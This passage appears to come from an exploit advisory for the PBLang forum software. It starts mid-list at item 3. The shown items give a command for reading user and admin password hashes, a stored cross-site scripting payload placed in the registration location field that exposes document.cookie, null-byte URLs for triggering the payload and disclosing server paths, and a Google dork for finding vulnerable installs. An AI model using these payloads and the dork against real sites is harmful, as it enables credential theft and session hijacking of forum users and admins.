3)admin/user credentials disclosure:

you can see password hash of any user or admin sending the command:

cat ./db/members/[username]


4) cross site scripting:

register and in location field type:

madrid"; echo "<script>alert(document.cookie)</script>

then check this url:

http://[target]/[path]/setcookie.php?u=[username]%00


5) path disclosure:

http://[target]/[path]/setcookie.php?u=%00


googledork: "Software PBLang" filetype:php

